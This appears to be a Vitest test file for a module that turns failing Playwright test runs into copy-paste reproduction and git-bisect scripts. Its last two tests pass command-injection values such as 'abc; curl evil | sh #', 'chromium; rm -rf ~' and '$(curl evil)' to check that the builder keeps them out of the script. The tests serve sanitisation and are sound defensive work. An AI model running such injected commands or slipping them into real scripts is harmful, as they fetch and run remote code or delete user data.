import { test, expect } from 'vitest';
import { buildReproRecipe, buildBisectScript, reproScript, type ReproInput } from '#shared/reproduce';

const baseInput: ReproInput = {
  commit: 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678',
  playwrightVersion: '1.50.1',
  browserName: 'chromium',
  projectName: 'chromium',
  environment: 'production',
  baseUrl: 'https://app.example.com',
  cases: [{ filePath: 'tests/login.spec.ts', title: 'should login', line: 10, projectName: 'chromium' }],
};

test('recipe — full checkout, pinned install, browser install and test command in order', () => {
  const recipe = buildReproRecipe(baseInput);
  const labels = recipe.steps.map((s) => s.step);
  expect(labels).toEqual([
    'Check out the failing commit',
    'Install dependencies',
    "Pin Playwright to the run's version",
    'Install the browser',
    'Run the failing test',
  ]);
  expect(recipe.steps[0]!.bash).toBe(`git switch --detach ${baseInput.commit}`);
  expect(recipe.steps[2]!.bash).toBe('npm install -D @playwright/test@1.50.1');
  expect(recipe.steps[3]!.bash).toBe('npx playwright install chromium');
  expect(recipe.steps[4]!.bash).toContain('tests/login.spec.ts:10');
  expect(recipe.steps[4]!.bash).toContain('--project="chromium"');
  expect(recipe.notes).toEqual([]);
});

test('recipe — a test with no file path a command can name gets no run step, rather than one that runs every test', () => {
  const recipe = buildReproRecipe({ ...baseInput, cases: [{ ...baseInput.cases[0]!, filePath: '-x.spec.ts' }] });
  expect(recipe.steps.map((s) => s.step)).not.toContain('Run the failing test');
  expect(recipe.notes).toEqual([
    'No failing test has a file path a command can name, so the step that runs it is left out.',
  ]);
  expect(buildReproRecipe({ ...baseInput, cases: [] }).steps.at(-1)!.bash).toBe('npx playwright test');
});

test('recipe — every step returns both shell forms', () => {
  const recipe = buildReproRecipe(baseInput);
  for (const step of recipe.steps) {
    expect(step.bash.length).toBeGreaterThan(0);
    expect(step.powershell.length).toBeGreaterThan(0);
  }
});

test('recipe — environment and base URL surface as env facts', () => {
  const recipe = buildReproRecipe(baseInput);
  expect(recipe.env).toEqual([
    { label: 'Environment', value: 'production' },
    { label: 'Base URL', value: 'https://app.example.com' },
  ]);
});

test('recipe — no commit skips the checkout and says so', () => {
  const recipe = buildReproRecipe({ ...baseInput, commit: null });
  expect(recipe.steps.map((s) => s.step)).not.toContain('Check out the failing commit');
  expect(recipe.notes.join(' ')).toContain('No commit');
});

test('recipe — unknown Playwright version drops the pin', () => {
  const recipe = buildReproRecipe({ ...baseInput, playwrightVersion: null });
  expect(recipe.steps.map((s) => s.step)).not.toContain("Pin Playwright to the run's version");
  expect(recipe.notes.join(' ')).toContain('Playwright version');
});

test('recipe — unknown browser installs all', () => {
  const recipe = buildReproRecipe({ ...baseInput, browserName: null });
  const install = recipe.steps.find((s) => s.step === 'Install the browser');
  expect(install!.bash).toBe('npx playwright install');
});

test('recipe — no cases falls back to plain playwright test', () => {
  const recipe = buildReproRecipe({ ...baseInput, cases: [] });
  const run = recipe.steps.find((s) => s.step === 'Run the failing test');
  expect(run!.bash).toBe('npx playwright test');
});

test('recipe — dedupes repeated specs so a shared file appears once', () => {
  const recipe = buildReproRecipe({
    ...baseInput,
    cases: [
      { filePath: 'tests/auth.spec.ts', title: 'a', line: null, projectName: 'API' },
      { filePath: 'tests/auth.spec.ts', title: 'b', line: null, projectName: 'API' },
    ],
  });
  const run = recipe.steps.find((s) => s.step === 'Run the failing test')!;
  expect(run.bash.match(/tests\/auth\.spec\.ts/g)).toHaveLength(1);
});

test('reproScript — assembles a copy-paste block with step comments', () => {
  const recipe = buildReproRecipe(baseInput);
  const bash = reproScript(recipe, 'bash');
  expect(bash).toContain('# Check out the failing commit');
  expect(bash).toContain(`git switch --detach ${baseInput.commit}`);
  expect(bash).toContain('# Run the failing test');
  // No trailing blank line.
  expect(bash.endsWith('\n')).toBe(false);
});

test('bisect — window present yields start / run / reset', () => {
  const result = buildBisectScript({
    good: 'aaaaaaa000',
    bad: 'bbbbbbb111',
    verifyCommand: 'npx playwright test x.spec.ts',
  });
  expect(result.available).toBe(true);
  if (!result.available) throw new Error('expected available');
  expect(result.bash).toContain('git bisect start bbbbbbb111 aaaaaaa000');
  expect(result.bash).toContain('git bisect run npx playwright test x.spec.ts');
  expect(result.bash).toContain('git bisect reset');
  expect(result.goodShort).toBe('aaaaaaa');
  expect(result.badShort).toBe('bbbbbbb');
  expect(result.explanation.length).toBeGreaterThan(0);
});

test('bisect — missing last-green commit degrades with a reason', () => {
  const result = buildBisectScript({ good: null, bad: 'bbbbbbb111', verifyCommand: 'npx playwright test' });
  expect(result.available).toBe(false);
  if (result.available) throw new Error('expected unavailable');
  expect(result.reason).toContain('last-green commit');
  expect(result.reason).toContain('git bisect start bbbbbbb <good commit>');
});

test('bisect — a failing run without a commit names where the commit comes from', () => {
  const result = buildBisectScript({ good: 'aaaaaaa000', bad: null, verifyCommand: 'npx playwright test' });
  expect(result.available).toBe(false);
  if (result.available) throw new Error('expected unavailable');
  expect(result.reason).toContain('Git checkout');
});

test('bisect — same commit on both ends has nothing to bisect', () => {
  const result = buildBisectScript({ good: 'same123', bad: 'same123', verifyCommand: 'npx playwright test' });
  expect(result.available).toBe(false);
  if (result.available) throw new Error('expected unavailable');
  expect(result.reason).toContain('nothing to bisect');
});

test('bisect — empty verify command falls back to playwright test', () => {
  const result = buildBisectScript({ good: 'aaa', bad: 'bbb', verifyCommand: '' });
  expect(result.available).toBe(true);
  if (!result.available) throw new Error('expected available');
  expect(result.bash).toContain('git bisect run npx playwright test');
});

test('reporter values that are not what they name stay out of the script', () => {
  const recipe = buildReproRecipe({
    ...baseInput,
    commit: 'abc; curl evil | sh #',
    playwrightVersion: '1.50.0 && curl evil',
    browserName: 'chromium; rm -rf ~',
  });
  const script = reproScript(recipe, 'bash');
  expect(script).not.toContain('curl');
  expect(script).not.toContain('rm -rf');
  expect(script).toContain('npx playwright install\n');
  expect(recipe.notes.join(' ')).toContain('not a plain revision');
});

test('no bisect is built from a commit that is not a plain revision', () => {
  const result = buildBisectScript({ good: 'a1b2c3d', bad: '$(curl evil)', verifyCommand: 'npx playwright test' });
  expect(result.available).toBe(false);
});
